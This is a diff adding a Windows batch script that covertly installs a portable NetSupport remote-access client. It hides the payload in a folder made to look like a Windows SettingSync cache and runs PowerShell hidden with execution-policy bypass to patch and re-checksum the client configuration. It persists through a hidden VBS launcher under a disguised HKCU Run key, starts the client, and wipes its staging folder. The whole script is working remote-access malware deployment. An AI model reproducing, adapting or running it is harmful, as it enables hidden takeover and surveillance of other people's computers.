@@ -1,0 +1,130 @@
+@echo off
+setlocal EnableExtensions
+cd /d "%~dp0"
+
+set "NO_PAUSE="
+set "CLEANUP_DIR="
+:parse_deploy_args
+if "%~1"=="" goto parse_deploy_args_done
+if /i "%~1"=="/nopause" (
+  set "NO_PAUSE=1"
+  shift
+  goto parse_deploy_args
+)
+set "CLEANUP_DIR=%~1"
+shift
+goto parse_deploy_args
+:parse_deploy_args_done
+if not defined CLEANUP_DIR if defined TAKEPC_STAGING set "CLEANUP_DIR=%TAKEPC_STAGING%"
+if not defined CLEANUP_DIR if defined NSM_WORK set "CLEANUP_DIR=%NSM_WORK%"
+
+REM Per-user LocalAppData path (includes real username automatically).
+set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\Windows\SettingSync\Caches\{8F7A2C1E-9B4D-4E6A-A3C8-1D5E7F90B2C4}\Win32\ResCache"
+set "PAYLOAD_DIR=%~dp0payload"
+set "CONFIG_SRC=%~dp0client32.ini"
+set "CKSINI=%~dp0cksini.exe"
+if not exist "%CKSINI%" if exist "%~dp0CKSINI.EXE" set "CKSINI=%~dp0CKSINI.EXE"
+set "PATCH=%~dp0patch-ini-filename.ps1"
+
+if not exist "%PAYLOAD_DIR%\Service.exe" (
+  echo [ERROR] payload\Service.exe not found.
+  exit /b 1
+)
+
+if not exist "%PAYLOAD_DIR%\NSM.LIC" (
+  echo [ERROR] payload\NSM.LIC not found.
+  exit /b 1
+)
+
+if not exist "%CONFIG_SRC%" (
+  echo [ERROR] client32.ini not found in Client-Portable folder.
+  exit /b 1
+)
+
+if not defined LOCALAPPDATA (
+  echo [ERROR] LOCALAPPDATA is not set. Cannot deploy.
+  exit /b 1
+)
+
+echo Creating target directory...
+echo   %TARGET_DIR%
+mkdir "%TARGET_DIR%" 2>nul
+if not exist "%TARGET_DIR%" (
+  echo [ERROR] Could not create: %TARGET_DIR%
+  exit /b 1
+)
+
+echo Copying portable payload...
+robocopy "%PAYLOAD_DIR%" "%TARGET_DIR%" /E /IS /IT /NFL /NDL /NJH /NJS /NC /NS /NP >nul
+REM robocopy: 0-7 = success; 8+ = failure (unlike xcopy where 1 can mean success)
+if errorlevel 8 (
+  echo [ERROR] Failed to copy payload into target directory.
+  exit /b 1
+)
+
+echo Installing client32.ini...
+copy /Y "%CONFIG_SRC%" "%TARGET_DIR%\client32.ini" >nul
+if not exist "%TARGET_DIR%\client32.ini" (
+  echo [ERROR] Failed to copy client32.ini
+  exit /b 1
+)
+
+echo Updating Filename= to real username path...
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PATCH%" -TargetDir "%TARGET_DIR%"
+if errorlevel 1 (
+  echo [WARN] Could not rewrite Filename= in client32.ini
+)
+
+if exist "%CKSINI%" (
+  echo Updating client32.ini checksum...
+  copy /Y "%CKSINI%" "%TARGET_DIR%\cksini.exe" >nul
+  call :run_cksini_hidden "%TARGET_DIR%"
+) else if exist "%TARGET_DIR%\cksini.exe" (
+  echo Updating client32.ini checksum...
+  call :run_cksini_hidden "%TARGET_DIR%"
+) else (
+  echo [WARN] cksini.exe not found — checksum not updated.
+)
+
+if not exist "%TARGET_DIR%\Service.exe" (
+  echo [ERROR] Service.exe missing after copy. Aborting start.
+  exit /b 1
+)
+
+echo Registering Service.exe to start at Windows logon...
+set "VBS=%TARGET_DIR%\ResCache.vbs"
+> "%VBS%" echo On Error Resume Next
+>> "%VBS%" echo Set sh = CreateObject("Wscript.Shell")
+>> "%VBS%" echo sh.CurrentDirectory = "%TARGET_DIR%"
+>> "%VBS%" echo sh.Run Chr(34) ^& "%TARGET_DIR%\Service.exe" ^& Chr(34), 0, False
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SettingSyncResCache /t REG_SZ /d "wscript.exe \"%VBS%\"" /f >nul
+if errorlevel 1 (
+  echo [WARN] Could not write HKCU Run key. Service.exe may not start after reboot.
+)
+
+echo Starting NetSupport client...
+pushd "%TARGET_DIR%"
+start "" /B Service.exe
+popd
+
+echo.
+echo Deployed to: %TARGET_DIR%
+echo Service.exe will start again at user logon via HKCU Run\SettingSyncResCache
+echo.
+call :remove_staging_dir
+if not defined NO_PAUSE pause
+exit /b 0
+
+:run_cksini_hidden
+set "CKS_TARGET=%~1"
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { Set-Location -LiteralPath $env:CKS_TARGET; if (Test-Path -LiteralPath (Join-Path $env:CKS_TARGET 'cksini.exe')) { & (Join-Path $env:CKS_TARGET 'cksini.exe') client32.ini } }" 2>nul
+set "CKS_TARGET="
+exit /b 0
+
+:remove_staging_dir
+if not defined CLEANUP_DIR exit /b 0
+if not exist "%CLEANUP_DIR%" exit /b 0
+echo Removing download and extract staging...
+cd /d "%TEMP%"
+rmdir /s /q "%CLEANUP_DIR%" 2>nul
+exit /b 0
